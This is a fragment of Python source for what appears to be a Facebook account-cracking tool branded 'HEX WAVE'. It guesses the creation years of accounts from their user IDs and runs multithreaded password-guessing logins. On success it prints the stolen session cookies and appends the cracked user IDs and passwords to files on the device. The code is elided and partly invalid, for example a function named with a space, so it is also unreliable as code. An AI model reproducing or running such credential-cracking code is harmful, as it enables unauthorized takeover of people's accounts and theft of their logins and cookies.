...
def HEX WAVE(uid):
    if len(uid)==15:
        ...
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:HEX WAVE = ' 2010'
        elif uid[:6] in ['100001']          :HEX WAVE = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :HEX WAVE = '√ 2011/2012'
        elif uid[:6] in ['100004']          :HEX WAVE = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :HEX WAVE = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :HEX WAVE = '√ 2014/2015'
        elif uid[:6] in ['100009']          :HEX WAVE = '√ 2015'
        elif uid[:5] in ['10001']           :HEX WAVE = '√ 2015/2016'
        elif uid[:5] in ['10002']           :HEX WAVE = '√ 2016/2017'
        elif uid[:5] in ['10003']           :HEX WAVE = '√ 2018/2019'
        elif uid[:5] in ['10004']           :HEX WAVE = '√ 2019/2020'
        elif uid[:5] in ['10005']           :HEX WAVE = '√ 2020'
        elif uid[:5] in ['10006','10007','']:HEX WAVE = '√ 2021'
        elif uid[:5] in ['10008']           :HEX WAVE = '√ 2022'
        elif uid[:5] in ['10009']           :HEX WAVE = '√ 2023'
        else:HEX WAVE=''
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mHEX WAVE')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [HEX WAVE-OK😘❤️] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/HEX WAVE.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [HEX WAVE-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/HEX WAVE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{random.choice(my_color)}HEX WAVE-CYBER{x}][%s|%s][OK:{random.choice(my_color)}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
